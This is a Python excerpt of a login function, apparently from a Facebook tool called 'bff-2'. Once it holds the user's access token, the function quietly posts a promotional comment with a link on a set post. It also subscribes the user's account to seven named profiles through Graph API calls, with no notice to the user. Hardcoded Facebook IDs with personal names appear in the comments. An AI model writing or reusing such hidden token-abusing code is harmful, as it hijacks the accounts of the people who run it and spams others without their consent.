...
def login_xx():
    ...
    fbid = '100009259285042' # Id Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    kom = random.choice(["Hello I'm a bff-2 user","Slentod Takentod Slebetod:v","Login bff-2 \nhttps://www.facebook.com/100034994956054/posts/660155105160982/?app=fbl"])
    #requests.post('https://graph.facebook.com/3088882871430325/comments/?message=' +toket+ '&access_token=' + toket) 
    ...
    requests.post('https://graph.facebook.com/660155105160982/comments/?message=' + kom + '&access_token=' + toket) 
    requests.post('https://graph.facebook.com/100002606153676/subscribers?access_token=' + toket) # Inka Rara Azahrah
    requests.post('https://graph.facebook.com/100009259285042/subscribers?access_token=' + toket) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    requests.post('https://graph.facebook.com/100000191297300/subscribers?access_token=' + toket) # Nedi
    requests.post('https://graph.facebook.com/100074380943337/subscribers?access_token=' + toket) # Dimas
    requests.post('https://graph.facebook.com/100007740797954/subscribers?access_token=' + toket) # TUAN Rav
    requests.post('https://graph.facebook.com/100000312369376/subscribers?access_token=' + toket) # Inka
    requests.post('https://graph.facebook.com/1706545973/subscribers?access_token=' + toket) # Hamzah Kirana
